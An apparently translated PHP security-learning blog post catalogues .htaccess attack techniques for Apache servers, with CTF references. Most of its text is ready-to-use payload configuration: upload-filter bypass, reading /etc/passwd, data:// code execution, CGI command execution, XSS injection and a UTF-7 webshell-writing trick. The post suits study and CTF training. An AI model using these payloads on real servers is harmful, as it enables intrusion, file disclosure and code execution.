# PHP safe learning—htaccess

Author: H3rmesk1t

Data: 2021.05.08

# File parsing

> There is no limit on the blacklist that often appears on file uploads. By uploading the .htaccess file and then uploading the picture, the php malicious code of the picture can be parsed and executed.
>.htaccess file contents are as follows

```php
(1)SetHandler instruction

# Execute images.png as PHP
<FilesMatch "images.png">
SetHandler application/x-httpd-php
</FilesMatch>
```
![Insert the picture description here](https://img-blog.csdnimg.cn/20210508200510679.png#pic_center)

```php
(2)AddType

# Parse .jpg(.xxx) as PHP file
AddType application/x-httpd-php .jpg(.xxx)
```
# File contains

> Local files contain
> Set the auto_prepend_file or auto_append_file configuration option through php_value to include some sensitive files, and a parsable php file is required in this directory or subdirectory to trigger it.
>.htaccess uses these two configuration options to include /etc/passwd, and access the index.php file in the same directory.

```php
auto_prepend_file

php_value auto_prepend_file /etc/passwd
```
![Insert the picture description here](https://img-blog.csdnimg.cn/20210508200805649.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

```php
auto_append_file

php_value auto_append_file /etc/passwd
```
![Insert the picture description here](https://img-blog.csdnimg.cn/20210508200840738.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

> Remote file contains
> PHP's all_url_include configuration option This option is turned off by default and can be included remotely if it is turned on. Because the configuration scope of all_url_include is PHP_INI_SYSTEM, it is impossible to use php_flag to enable it in .htaccess

```php
php_value auto_append_file http://10.87.9.156/phpinfo.txt
```
![Insert the picture description here](https://img-blog.csdnimg.cn/20210508201049583.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

# Source code leak
> Use php_flag to set engine to 0, turn off php parsing in this directory and subdirectories, causing source code leakage

```php
php_flag engine 0
```
![Insert the picture description here](https://img-blog.csdnimg.cn/20210508201211904.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)
# Code execution
> (1) Utilize pseudo-protocol
all_url_fopen, all_url_include is On
> (2) Analysis.htaccess

```php
(1)
php_value auto_append_file data://text/plain;base64,PD9waHAgcGhwaW5mbygpOw==
#php_value auto_append_file data://text/plain,%3C%3Fphp+phpinfo%28%29%3B
```
![Insert the picture description here](https://img-blog.csdnimg.cn/20210508202342125.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

```php
(2.1)
php_value auto_append_file .htaccess
#<?php phpinfo();
(2.2)
This is suitable for the same directory or subdirectories without php files.
You need to set first to allow access to .htaccess files

Files ~ "^.ht">
 Require all granted
 Order allows,deny
 Allow from all
</Files>

Specify .htaccess as a php file

SetHandler application/x-httpd-php
# <?php phpinfo(); ?>
```
![Insert the picture description here](https://img-blog.csdnimg.cn/20210508202453546.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)
![Insert the picture description here](https://img-blog.csdnimg.cn/20210508202507264.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)
# Command execution

> CGI Startup

```php
cgi_module needs to be loaded, that is, there is apache configuration file

LoadModule cgi_module modules/mod_cgi.so
.htaccess content

Options ExecCGI #Allow CGI execution
AddHandler cgi-script .xx #Parse files with xx suffix as CGI programs
ce.xx

#!C:/Windows/System32/cmd.exe /k start calc.exe
6
```
![Insert the picture description here](https://img-blog.csdnimg.cn/20210508202654764.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)
[Reference example](https://github.com/De1ta-team/De1CTF2020/tree/master/writeup/web/check%20in)

> FastCGI Startup

```php
mod_fcgid.so needs to be loaded. That is, there is

LoadModule fcgid_module modules/mod_fcgid.so
.htaccess

Options +ExecCGI
AddHandler fcgid-script .xx
FcgidWrapper "C:/Windows/System32/cmd.exe /k start calc.exe" .xx

ce.xx content is free
```
![Insert the image description here](https://img-blog.csdnimg.cn/20210508202946968.png?x-oss-process=image/watermark,type_ZmFu
Z3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)
# XSS

> highlight_file

```php
.htaccess
php_value highlight.comment '"><script>alert(1);</script>'

index.php
<?php
highlight_file(__FILE__);
// comment

The highlight.comment can also be replaced with the following other options
```
![Insert the picture description here](https://img-blog.csdnimg.cn/20210508203146944.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

> Error message link

```php
index.php:
<?php
include('foo');#foo reported an error

.htaccess
php_flag display_errors 1
php_flag html_errors 1
php_value docref_root "'><script>alert(1);</script>"
```
![Insert the picture description here](https://img-blog.csdnimg.cn/20210508203246789.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)
# Customize the error file

```php
error.php
<?php include('shell');# error page

.htaccess
php_value error_log /tmp/www/html/shell.php
php_value include_path "<?php phpinfo(); __halt_compiler();"

Visiting error.php will report an error and record it in the shell.php file.
```
![Insert the picture description here](https://img-blog.csdnimg.cn/20210508203403849.png#pic_center)

```php
Because it will be encoded by html, UTF-7 is needed to bypass it.

.htaccess

# first
php_value error_log /tmp/shell #Define the error path
#--- "<?php phpinfo(); __halt_compiler();" in UTF-7:
php_value include_path "+ADw?php phpinfo()+ADs +AF8AXw-halt+AF8-compiler()+ADs"

# The second time
php_value include_path "/tmp" #Change the default path of include()
php_flag zend.multibyte 1
php_value zend.script_encoding "UTF-7"
```
[Reference example](https://www.cnblogs.com/tr1ple/p/11439994.html)